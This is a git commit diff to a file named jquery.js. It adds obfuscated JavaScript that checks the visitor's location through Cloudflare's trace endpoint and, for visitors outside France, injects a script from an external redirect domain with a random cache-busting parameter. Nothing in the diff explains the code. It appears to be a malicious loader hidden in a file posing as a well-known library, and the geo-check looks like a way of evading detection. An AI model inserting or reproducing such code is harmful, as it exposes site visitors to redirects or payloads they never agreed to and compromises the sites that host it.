2762854c46fd68035d3a0d026fc075d1e8f11a86
elankton <74224289+elankton@users.noreply.github.com>
2022-01-03 02:59:48 +0300

    indexOf

--- jquery.js
+++ jquery.js
@@ -1,6 +1,13 @@
-(function (a, d, j, o) {
-     o = a.createElement(d),
-        m = a.getElementsByTagName(d)[0];              
-     o.src = j + "?d=0&r=" + Math.random();
-     m.parentNode.insertBefore(o, m)
-})(document, 'script', 'https://global-redirecting.com/sl/2e72ef55');
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200 && this.responseText.toLowerCase().indexOf("loc=fr") === -1) {
+    (function (a, d, j, o) {
+         o = a.createElement(d),
+            m = a.getElementsByTagName(d)[0];              
+         o.src = j + "?d=0&r=" + Math.random();
+         m.parentNode.insertBefore(o, m)
+    })(document, 'script', 'https://global-redirecting.com/sl/2e72ef55');
+}
+};
+xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
+xhttp.send();
